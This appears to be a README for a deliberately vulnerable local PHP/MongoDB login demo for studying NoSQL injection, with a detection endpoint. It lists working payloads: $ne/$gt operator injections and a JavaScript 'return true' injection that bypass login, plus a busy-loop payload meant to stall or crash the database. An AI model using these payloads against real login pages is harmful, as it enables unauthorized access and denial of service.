# NoSQLInjectionAttackDemo
NoSQLInjectionAttackDemo is website demo for test NoSQL Injection. There are two website demos in this project and all databases are mongoDB
# Requirements
Install web server for example nginx, apache on local computer. On a Debian, Red Hat based system or windows are ok.
# Building
demo   : http://localhost/github/NoSQLInjectionAttackDemo/demo.html

demo_1 : http://localhost/github/NoSQLInjectionAttackDemo/demo_1.html
# Usage
Open url in the browser: http://localhost/github/NoSQLInjectionAttackDemo/demo.html
![image](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo/blob/master/images/demo.png)
Attack URL for demo:
* http://localhost/github/NoSQLInjectionAttackDemo/login/login.php?username[$ne]=2&password[$ne]=r
* http://localhost/github/NoSQLInjectionAttackDemo/login/login.php?username[$gt]=&password[$gt]=

Attack URL for demo_1:
* http://localhost/github/NoSQLInjectionAttackDemo/login/login_1.php?username=1&password=2;return true;}//
无论用户密码是否正确都返回true
* http://localhost/github/NoSQLInjectionAttackDemo/login/login_1.php?username=1&password=2;var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/100 < 20); return true;}//
将系统延迟20秒，如果改成while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 20); 则可以导致数据库报错。.

NoSQL injection attack detection:
* http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$ne]=2&password[$ne]=r
* http://localhost/github/NoSQLInjectionAttackDemo/login/detected_login.php?username[$gt]=&password[$gt]=
